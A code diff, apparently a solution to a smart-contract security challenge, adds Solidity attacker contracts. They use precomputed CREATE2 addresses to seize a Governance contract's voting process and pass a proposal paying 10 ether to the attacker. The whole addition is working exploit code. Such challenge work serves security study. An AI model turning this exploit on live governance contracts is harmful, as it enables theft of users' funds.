@@ -124,3 +124,86 @@ contract CommunityWallet {
 
     fallback() external payable {}
 }
+
+contract GovernanceAttacker {
+    function attack(Governance governance) public {
+        bytes memory proposal = abi.encodeWithSignature("exec(address,bytes,uint256)", msg.sender, "", 10 ether);
+        uint256 proposalId = uint256(keccak256(proposal));
+
+        uint nonce = 1;
+        address preCalcedViceroy = getCreate2Address(type(AttackerViceroy).creationCode, nonce);
+        address[] memory preCalcedVoters = getPreCalculatedAddresses(type(AttackerVoter).creationCode, 5);
+
+        // elect viceroy
+        governance.appointViceroy(preCalcedViceroy, nonce);
+
+        // deploy viceroy
+        AttackerViceroy viceroy = new AttackerViceroy{salt: bytes32(nonce)}();
+        assert(address(viceroy) == preCalcedViceroy);
+
+        // elect voter
+        viceroy.electVoters(governance, preCalcedVoters);
+
+        // deploy voter
+        deployVoters(5);
+
+        // submit proposal
+        AttackerVoter(preCalcedVoters[0]).propose(governance, address(viceroy), proposal);
+
+        // vote
+        for (uint i; i < preCalcedVoters.length; i++) {
+            AttackerVoter(preCalcedVoters[i]).vote(governance, proposalId, address(viceroy));
+        }
+        (uint votes, ) = governance.proposals(proposalId);
+        assert(votes == preCalcedVoters.length);
+    }
+
+    function deployVoters(uint num) public {
+        for (uint i; i < num; i++) {
+            new AttackerVoter{salt: bytes32(i)}();
+        }
+    }
+
+    function getPreCalculatedAddresses(bytes memory bytecode, uint num) internal view returns (address[] memory) {
+        address[] memory addresses = new address[](num);
+        for (uint i; i < num; i++) {
+            addresses[i] = getCreate2Address(bytecode, i);
+        }
+        return addresses;
+    }
+
+    function getCreate2Address(bytes memory bytecode, uint _salt) internal view returns (address) {
+        // get a hash concatenating args passed to encodePacked
+        bytes32 hash = keccak256(
+            abi.encodePacked(
+                bytes1(0xff), // 0
+                address(this), // address of factory contract
+                _salt, // salt
+                keccak256(bytecode) // bytecode of contract to be deployed
+            )
+        );
+
+        // Cast last 20 bytes of hash to address
+        return address(uint160(uint256(hash)));
+    }
+}
+
+// TODO: propose in constructor
+contract AttackerViceroy {
+    function electVoters(Governance governance, address[] memory voters) public {
+        for (uint i; i < voters.length; i++) {
+            address voter = voters[i];
+            governance.approveVoter(voter);
+        }
+    }
+}
+
+contract AttackerVoter {
+    function propose(Governance governance, address viceroy, bytes memory proposal) public {
+        governance.createProposal(viceroy, proposal);
+    }
+
+    function vote(Governance governance, uint256 proposalId, address viceroy) public {
+        governance.voteOnProposal(proposalId, true, viceroy);
+    }
+}
